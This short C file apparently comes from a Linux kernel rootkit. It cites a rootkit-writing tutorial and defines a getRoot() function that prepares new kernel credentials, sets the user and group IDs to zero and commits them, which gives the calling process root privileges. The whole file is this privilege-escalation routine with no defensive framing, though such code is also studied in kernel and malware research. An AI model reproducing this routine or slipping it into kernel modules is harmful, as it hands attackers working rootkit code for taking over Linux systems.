#include <linux/cred.h>
#include "getRoot.h"

// based on http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt

void getRoot(void) {
	/* Here we give root privileges */
	struct cred *new = prepare_creds();

	new->uid = new->euid = 0;
	new->gid = new->egid = 0;
	commit_creds(new);
}
